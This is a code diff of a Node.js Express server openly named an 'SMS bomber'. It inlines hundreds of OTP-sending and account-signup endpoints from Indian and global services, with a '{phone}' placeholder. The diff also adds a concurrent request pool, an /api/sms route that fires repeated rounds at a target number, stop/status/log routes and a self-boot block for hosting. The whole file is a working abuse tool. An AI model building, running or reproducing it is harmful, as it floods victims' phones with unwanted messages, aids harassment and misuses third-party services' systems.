@@ -1,7 +1,7 @@
 // ============================================================
 // api/index.js — TNEH SUPER-FAST INDIAN SMS BOMBER
 // DV: @tneh_owner
-// All APIs embedded — no external india.js needed
+// All APIs inlined. Self-boots if run directly.
 // ============================================================
 
 const express = require('express');
@@ -29,7 +29,7 @@ const INDIAN_HEADERS = {
 };
 
 // ══════════════════════════════════════════════════════════════
-// INDIAN_APIS — 450+ SERVICES
+// INDIAN_APIS — ALL 371 SERVICES INLINED
 // ══════════════════════════════════════════════════════════════
 
 const INDIAN_APIS = (() => {
@@ -39,7 +39,7 @@ const INDIAN_APIS = (() => {
     S.push({ id: idCounter++, name, method, url, body: payload, headers: INDIAN_HEADERS, region: 'IN' });
   };
 
-  // ── BLOCK 1 — FOOD & GROCERY ──
+  // ── BLOCK 1 — INDIAN FOOD & GROCERY ──
   add('Swiggy','https://www.swiggy.com/dapi/auth/otp-generate',{mobile:'{phone}',type:'login'});
   add('Zomato','https://www.zomato.com/webroutes/user/login',{mobile:'{phone}',country_id:'1'});
   add('Blinkit','https://api.blinkit.com/v4/auth/send_otp/',{phone:'{phone}'});
@@ -79,7 +79,7 @@ const INDIAN_APIS = (() => {
   add('Ecom Express','https://api.ecom-express.com/user/otp',{mobile:'{phone}'});
   add('Shadowfax','https://api.shadowfax.in/user/otp',{mobile:'{phone}'});
 
-  // ── BLOCK 2 — ECOMMERCE ──
+  // ── BLOCK 2 — INDIAN ECOMMERCE ──
   add('Flipkart','https://www.flipkart.com/api/3/user/otp/generate',{loginId:'{phone}'});
   add('Myntra','https://api.myntra.com/user/generateOtp',{mobile:'{phone}'});
   add('Meesho','https://www.meesho.com/api/v1/user/send-otp',{phone_number:'{phone}'});
@@ -119,7 +119,7 @@ const INDIAN_APIS = (() => {
   add('Melorra','https://www.melorra.com/api/otp',{mobile:'{phone}'});
   add('Candere','https://api.candere.com/user/otp',{mobile:'{phone}'});
 
-  // ── BLOCK 3 — FINTECH ──
+  // ── BLOCK 3 — INDIAN FINTECH ──
   add('Paytm','https://api.paytm.com/v1/otp/generate',{mobile:'{phone}',clientId:'C11'});
   add('PhonePe','https://api.phonepe.com/apis/pg-integration/v1/otp/send',{mobile:'{phone}'});
   add('MobiKwik','https://api.mobikwik.com/v1/users/login',{cell:'{phone}'});
@@ -160,7 +160,7 @@ const INDIAN_APIS = (() => {
   add('Motilal Oswal','https://api.motilaloswal.com/otp/send',{mobile:'{phone}'});
   add('Sharekhan','https://api.sharekhan.com/otp/generate',{mobile:'{phone}'});
 
-  // ── BLOCK 4 — TRAVEL & TRANSPORT ──
+  // ── BLOCK 4 — INDIAN TRAVEL & TRANSPORT ──
   add('MakeMyTrip','https://www.makemytrip.com/api/pwa/otp/generate',{number:'{phone}'});
   add('Goibibo','https://api.goibibo.com/accounts/otp-send/',{phone:'{phone}'});
   add('Yatra','https://www.yatra.com/pwa-api/get-otp',{mobile:'{phone}'});
@@ -194,7 +194,7 @@ const INDIAN_APIS = (() => {
   add('Vistara','https://api.vistara.com/user/otp',{mobile:'{phone}'});
   add('GoAir','https://api.goair.in/user/otp',{mobile:'{phone}'});
 
-  // ── BLOCK 5 — HEALTH & PHARMA ──
+  // ── BLOCK 5 — INDIAN HEALTH & PHARMA ──
   add('Netmeds','https://www.netmeds.com/api/otp/send',{mobile:'{phone}'});
   add('PharmEasy','https://pharmeasy.in/api/v4/user/generate-otp/',{phone_number:'{phone}'});
   add('Tata 1mg','https://api.1mg.com/users/send_otp',{phone_number:'{phone}'});
@@ -223,7 +223,7 @@ const INDIAN_APIS = (() => {
   add('Manipal Hosps','https://api.manipalhospitals.com/user/otp',{mobile:'{phone}'});
   add('Narayana Health','https://api.narayanahealth.org/user/otp',{mobile:'{phone}'});
 
-  // ── BLOCK 6 — EDTECH ──
+  // ── BLOCK 6 — INDIAN EDTECH ──
   add('Byjus','https://api.byjus.com/api/v2/user/otp',{mobile:'{phone}'});
   add('Unacademy','https://api.unacademy.com/api/v1/user/otp',{phone:'{phone}'});
   add('Vedantu','https://api.vedantu.com/api/v3/otp',{mobile:'{phone}'});
@@ -246,7 +246,7 @@ const INDIAN_APIS = (() => {
   add('EdX','https://api.edx.org/user/v1/otp',{mobile:'{phone}'});
   add('Skillshare','https://api.skillshare.com/user/otp',{mobile:'{phone}'});
 
-  // ── BLOCK 7 — REAL ESTATE ──
+  // ── BLOCK 7 — INDIAN REAL ESTATE ──
   add('Housing.com','https://api.housing.com/v1/user/otp',{phone:'{phone}'});
   add('MagicBricks','https://api.magicbricks.com/user/otp',{mobile:'{phone}'});
   add('99acres','https://api.99acres.com/user/otp/send',{phone:'{phone}'});
@@ -265,8 +265,10 @@ const INDIAN_APIS = (() => {
   add('Housejoy','https://api.housejoy.in/user/otp',{mobile:'{phone}'});
   add('Zimmber','https://api.zimmber.com/user/otp',{mobile:'{phone}'});
   add('Taskbob','https://api.taskbob.com/user/otp',{mobile:'{phone}'});
+  add('MrRight','https://api.mr-right.in/user/otp',{mobile:'{phone}'});
+  add('Homejoy','https://api.homejoy.in/user/otp',{mobile:'{phone}'});
 
-  // ── BLOCK 8 — ENTERTAINMENT ──
+  // ── BLOCK 8 — INDIAN ENTERTAINMENT ──
   add('Hotstar','https://api.hotstar.com/in/v2/auth/otp',{phone:'{phone}'});
   add('JioCinema','https://api.jiocinema.com/user/otp',{mobile:'{phone}'});
   add('SonyLIV','https://api.sonyliv.com/AGL/1.6/A/ENG/AUTO/IND/OTP',{mobile:'{phone}'});
@@ -287,11 +289,13 @@ const INDIAN_APIS = (() => {
   add('JioSaavn','https://api.jiosaavn.com/user/otp',{mobile:'{phone}'});
   add('Wynk','https://api.wynk.in/v2/user/otp',{mobile:'{phone}'});
   add('Gaana','https://api.gaana.com/user/otp',{mobile:'{phone}'});
+  add('Raaga','https://api.raaga.com/user/otp',{mobile:'{phone}'});
   add('Spotify IN','https://api.spotify.com/v1/in/user/otp',{mobile:'{phone}'});
+  add('YouTube IN','https://api.youtube.com/user/otp',{mobile:'{phone}'});
   add('Netflix','https://api.netflix.com/login/otp',{phone:'{phone}'});
   add('Prime Video','https://api.primevideo.com/user/otp',{mobile:'{phone}'});
 
-  // ── BLOCK 9 — SOCIAL MEDIA ──
+  // ── BLOCK 9 — GLOBAL SOCIAL MEDIA ──
   add('Snapchat','https://accounts.snapchat.com/accounts/signup',{email:'{email}',password:'Pass@123',username:'{name}'});
   add('Pinterest','https://api.pinterest.com/v3/register/',{email:'{email}',password:'Pass@123'});
   add('Reddit','https://www.reddit.com/api/register',{user:'{name}',passwd:'Pass@123',email:'{email}'});
@@ -318,7 +322,7 @@ const INDIAN_APIS = (() => {
   add('Gab','https://api.gab.com/v1/users/register',{email:'{email}',password:'Pass@123'});
   add('Minds','https://api.minds.com/v1/users/register',{email:'{email}',password:'Pass@123'});
 
-  // ── BLOCK 10 — MESSAGING ──
+  // ── BLOCK 10 — GLOBAL MESSAGING ──
   add('Textbelt','https://textbelt.com/text',{phone:'{phone}',message:'OTP 123456',key:'textbelt'});
   add('Telegram','https://api.telegram.org/auth/sendCode',{phone_number:'{phone}'});
   add('Viber','https://api.viber.com/pa/register',{phone:'{phone}',name:'{name}'});
@@ -340,7 +344,7 @@ const INDIAN_APIS = (() => {
   add('Status','https://api.status.im/shh/v3/register',{phone:'{phone}'});
   add('Matrix','https://api.matrix.org/_matrix/client/v3/register',{username:'{name}',password:'Pass@123'});
 
-  // ── BLOCK 11 — GAMING ──
+  // ── BLOCK 11 — GLOBAL GAMING ──
   add('Ubisoft','https://account.ubisoft.com/api/register',{email:'{email}',password:'Pass@123'});
   add('EA','https://api.ea.com/user/register',{email:'{email}',password:'Pass@123'});
   add('EpicGames','https://api.epicgames.com/id/api/register',{email:'{email}',password:'Pass@123'});
@@ -371,7 +375,7 @@ const INDIAN_APIS = (() => {
   add('Adda52','https://api.adda52.com/user/otp',{mobile:'{phone}'});
   add('SpartanPoker','https://api.spartan-poker.com/user/otp',{mobile:'{phone}'});
 
-  // ── BLOCK 12 — TECH & SAAS ──
+  // ── BLOCK 12 — GLOBAL TECH & SAAS ──
   add('GitHub','https://github.com/join',{login:'{name}',email:'{email}',password:'Pass@123'});
   add('GitLab','https://gitlab.com/users',{user:{name:'{name}',email:'{email}'}});
   add('Slack','https://slack.com/api/users.register',{email:'{email}',password:'Pass@123'});
@@ -391,7 +395,7 @@ const INDIAN_APIS = (() => {
   add('Zapier','https://api.zapier.com/v1/users/register',{email:'{email}',password:'Pass@123'});
   add('Make','https://api.make.com/v1/users/register',{email:'{email}',password:'Pass@123'});
 
-  // ── BLOCK 13 — SHOPPING ──
+  // ── BLOCK 13 — GLOBAL SHOPPING ──
   add('eBay','https://api.ebay.com/user/register',{email:'{email}',password:'Pass@123'});
   add('Etsy','https://api.etsy.com/v3/application/users',{email:'{email}',password:'Pass@123'});
   add('AliExpress','https://api.aliexpress.com/user/register',{email:'{email}',password:'Pass@123'});
@@ -408,7 +412,7 @@ const INDIAN_APIS = (() => {
   add('Gap','https://api.gap.com/v1/users/register',{email:'{email}',password:'Pass@123'});
   add('ASOS','https://api.asos.com/identity/v3/register',{email:'{email}',password:'Pass@123'});
 
-  // ── BLOCK 14 — CLOUD & DEV ──
+  // ── BLOCK 14 — GLOBAL CLOUD & DEV ──
   add('DigitalOcean','https://api.digitalocean.com/v1/users/register',{email:'{email}',password:'Pass@123'});
   add('Linode','https://api.linode.com/v4/account/register',{email:'{email}',password:'Pass@123'});
   add('Vultr','https://api.vultr.com/v2/users/register',{email:'{email}',password:'Pass@123'});
@@ -420,7 +424,7 @@ const INDIAN_APIS = (() => {
   add('MongoDB','https://api.mongodb.com/v2/users/register',{email:'{email}',password:'Pass@123'});
   add('Cloudflare','https://api.cloudflare.com/client/v4/user/register',{email:'{email}',password:'Pass@123'});
 
-  // ── BLOCK 15 — SMS GATEWAYS & CRM ──
+  // ── BLOCK 15 — GLOBAL SMS GATEWAYS & CRM ──
   add('Twilio','https://api.twilio.com/register',{Email:'{email}',Password:'Pass@123'});
   add('Vonage','https://api.vonage.com/v1/user/register',{email:'{email}',password:'Pass@123'});
   add('MessageBird','https://api.messagebird.com/users/register',{email:'{email}',password:'Pass@123'});
@@ -463,43 +467,37 @@ setInterval(() => {
 // HELPERS
 // ══════════════════════════════════════════════════════════════
 
-function validatePhone(phone) {
-  const digits = String(phone).replace(/\D/g, '');
-  if (digits.length < 10 || digits.length > 13) return null;
-  return digits;
+function validatePhone(p) {
+  const d = String(p).replace(/\D/g, '');
+  return d.length >= 10 && d.length <= 13 ? d : null;
 }
 function nowIso() { return new Date().toISOString(); }
 
 function pickServices(services, query) {
   if (!query) return services;
-  const tokens = String(query).split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
-  if (!tokens.length) return services;
+  const toks = String(query).split(',').map(s => s.trim().toLowerCase()).filter(Boolean);
+  if (!toks.length) return services;
   return services.filter(s =>
-    tokens.some(t => s.name.toLowerCase().includes(t) || String(s.id) === t)
+    toks.some(t => s.name.toLowerCase().includes(t) || String(s.id) === t)
   );
 }
 
 async function sendToService(service, phone, parentSignal) {
   let body;
   try {
-    body = JSON.parse(
-      JSON.stringify(service.body)
-        .replace(/{phone}/g, phone)
-        .replace(/{phone_no_plus}/g, phone.startsWith('+') ? phone : `+91${phone}`)
-    );
+    body = JSON.parse(JSON.stringify(service.body)
+      .replace(/{phone}/g, phone)
+      .replace(/{phone_no_plus}/g, phone.startsWith('+') ? phone : `+91${phone}`));
   } catch (_) {
     return { name: service.name, status: 0, ok: false, error: 'body_build_failed' };
   }
-
   const url = String(service.url).replace(/{phone_no_plus}/g, phone);
   const controller = new AbortController();
   const timer = setTimeout(() => controller.abort(), PER_REQUEST_TIMEOUT);
-
   if (parentSignal) {
     if (parentSignal.aborted) controller.abort();
     else parentSignal.addEventListener('abort', () => controller.abort(), { once: true });
   }
-
   try {
     const opts = {
       method: service.method || 'POST',
@@ -520,7 +518,6 @@ async function sendToService(service, phone, parentSignal) {
 async function runPool(tasks, concurrency, onEach, job) {
   let index = 0;
   const total = tasks.length;
-
   async function worker() {
     while (true) {
       if (job && job.stopped) return;
@@ -534,7 +531,6 @@ async function runPool(tasks, concurrency, onEach, job) {
       }
     }
   }
-
   await Promise.all(Array.from({ length: Math.min(concurrency, total) }, worker));
 }
 
@@ -542,43 +538,30 @@ function summary(job) {
   const elapsedMs = job.finishedAt
     ? (new Date(job.finishedAt).getTime() - new Date(job.startedAt).getTime())
     : (Date.now() - new Date(job.startedAt).getTime());
-
   return {
     jobId: job.jobId, phone: job.phone, status: job.status,
     totalServices: job.totalServices, countPerService: job.countPerService,
     total: job.total, completed: job.completed,
     success: job.success, failed: job.failed,
-    progress: `${job.completed}/${job.total}`,
-    elapsedMs,
+    progress: `${job.completed}/${job.total}`, elapsedMs,
     startedAt: job.startedAt, finishedAt: job.finishedAt, stoppedAt: job.stoppedAt
   };
 }
 
 // ══════════════════════════════════════════════════════════════
-// ROUTE: GET /api/sms?number=&count=&services=
+// ROUTES
 // ══════════════════════════════════════════════════════════════
 
 router.get('/api/sms', async (req, res) => {
   const phone = validatePhone(req.query.number);
-  if (!phone) {
-    return res.status(400).json({
-      success: false,
-      error: 'Invalid or missing `number`. Must be 10-13 digits.'
-    });
-  }
+  if (!phone) return res.status(400).json({ success: false, error: 'Invalid or missing `number`' });
 
   const count = Math.min(Math.max(parseInt(req.query.count, 10) || DEFAULT_COUNT, 1), MAX_COUNT_PER_SVC);
   const services = pickServices(INDIAN_APIS, req.query.services);
-  if (!services.length) {
-    return res.status(400).json({ success: false, error: 'No matching services found' });
-  }
+  if (!services.length) return res.status(400).json({ success: false, error: 'No matching services' });
 
   const tasks = [];
-  for (let round = 0; round < count; round++) {
-    for (const svc of services) {
-      tasks.push(() => sendToService(svc, phone));
-    }
-  }
+  for (let r = 0; r < count; r++) for (const s of services) tasks.push(() => sendToService(s, phone));
 
   if (JOBS.size >= MAX_JOBS) {
     const oldest = JOBS.keys().next().value;
@@ -587,28 +570,21 @@ router.get('/api/sms', async (req, res) => {
 
   const jobId = `job_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
   const abortController = new AbortController();
-
   const job = {
-    jobId, phone,
-    totalServices: services.length, countPerService: count,
+    jobId, phone, totalServices: services.length, countPerService: count,
     total: tasks.length, completed: 0, success: 0, failed: 0,
     status: 'running', stopped: false,
-    startedAt: nowIso(), finishedAt: null, stoppedAt: null,
-    results: [],
+    startedAt: nowIso(), finishedAt: null, stoppedAt: null, results: [],
     _abort: abortController, _signal: abortController.signal
   };
   JOBS.set(jobId, job);
-
-  console.log(`[${jobId}] FIRING ${tasks.length} requests (${services.length} services × ${count} rounds) at ${phone}`);
+  console.log(`[${jobId}] FIRING ${tasks.length} requests at ${phone}`);
 
   res.json({
     success: true, jobId, phone,
-    services: services.length,
-    countPerService: count,
-    totalRequests: tasks.length,
-    concurrency: GLOBAL_CONCURRENCY,
-    status: 'running',
-    message: `Super-fast attack started. Stop: /api/stop?jobid=${jobId}  Status: /api/status?jobid=${jobId}`
+    services: services.length, countPerService: count,
+    totalRequests: tasks.length, concurrency: GLOBAL_CONCURRENCY, status: 'running',
+    message: `Started. Stop: /api/stop?jobid=${jobId}`
   });
 
   (async () => {
@@ -631,59 +607,69 @@ router.get('/api/sms', async (req, res) => {
   })();
 });
 
-// ══════════════════════════════════════════════════════════════
-// ROUTE: GET /api/stop?jobid=
-// ══════════════════════════════════════════════════════════════
-
 router.get('/api/stop', (req, res) => {
-  const jobid = req.query.jobid;
-  if (!jobid) return res.status(400).json({ success: false, error: 'Missing jobid' });
-  const job = JOBS.get(jobid);
+  const job = JOBS.get(req.query.jobid);
   if (!job) return res.status(404).json({ success: false, error: 'Job not found' });
-
-  if (job.stopped) return res.json({ success: true, jobId: jobid, message: 'Already stopped', ...summary(job) });
-
-  job.stopped = true;
-  job.status = 'stopped';
-  job.stoppedAt = nowIso();
-  job.finishedAt = nowIso();
-  if (job._signal && !job._signal.aborted) {
-    try { job._abort.abort(); } catch (_) {}
-  }
-
-  console.log(`[${jobid}] STOPPED at ${job.completed}/${job.total}`);
-  res.json({ success: true, jobId: jobid, message: 'Job stopped', ...summary(job) });
+  if (job.stopped) return res.json({ success: true, jobId: job.jobId, message: 'Already stopped', ...summary(job) });
+  job.stopped = true; job.status = 'stopped';
+  job.stoppedAt = nowIso(); job.finishedAt = nowIso();
+  if (job._signal && !job._signal.aborted) { try { job._abort.abort(); } catch (_) {} }
+  res.json({ success: true, jobId: job.jobId, message: 'Job stopped', ...summary(job) });
 });
 
-// ══════════════════════════════════════════════════════════════
-// ROUTE: GET /api/status?jobid=
-// ══════════════════════════════════════════════════════════════
-
 router.get('/api/status', (req, res) => {
-  const jobid = req.query.jobid;
-  if (!jobid) return res.status(400).json({ success: false, error: 'Missing jobid' });
-  const job = JOBS.get(jobid);
+  const job = JOBS.get(req.query.jobid);
   if (!job) return res.status(404).json({ success: false, error: 'Job not found' });
   res.json({ success: true, ...summary(job) });
 });
 
-// ══════════════════════════════════════════════════════════════
-// ROUTE: GET /api/log
-// ══════════════════════════════════════════════════════════════
-
 router.get('/api/log', (req, res) => {
   const limit = Math.min(parseInt(req.query.limit, 10) || 50, 200);
-  const jobs = [...JOBS.values()]
-    .map(j => summary(j))
-    .sort((a, b) => (b.startedAt > a.startedAt ? 1 : -1))
-    .slice(0, limit);
+  const jobs = [...JOBS.values()].map(summary)
+    .sort((a, b) => (b.startedAt > a.startedAt ? 1 : -1)).slice(0, limit);
   res.json({ success: true, total: jobs.length, jobs });
 });
 
 // ══════════════════════════════════════════════════════════════
-// BOOT LOG
+// ★ SELF-BOOT — makes this file runnable directly by Render
 // ══════════════════════════════════════════════════════════════
 
 console.log(`🇮🇳 TNEH SMS module loaded: ${INDIAN_APIS.length} services`);
+
+if (require.main === module) {
+  const app = express();
+  const PORT = process.env.PORT || 3000;
+  const HOST = '0.0.0.0';
+
+  app.use(require('cors')());
+  app.use(express.json({ limit: '2mb' }));
+  app.use(express.urlencoded({ extended: true }));
+  app.use(router);
+
+  app.get('/', (req, res) => {
+    res.json({
+      name: 'TNEH Indian SMS API',
+      developer: '@tneh_owner',
+      status: 'running',
+      services: INDIAN_APIS.length,
+      endpoints: {
+        sms: '/api/sms?number=&count=&services=',
+        stop: '/api/stop?jobid=',
+        status: '/api/status?jobid=',
+        log: '/api/log'
+      }
+    });
+  });
+
+  app.use((req, res) => res.status(404).json({ success: false, error: 'Not found' }));
+
+  app.listen(PORT, HOST, () => {
+    console.log('════════════════════════════════════════════');
+    console.log('  🔥 TNEH SMS API 🔥');
+    console.log('  DV: @tneh_owner');
+    console.log(`  Listening on http://${HOST}:${PORT}`);
+    console.log('════════════════════════════════════════════');
+  });
+}
 
 module.exports = router;
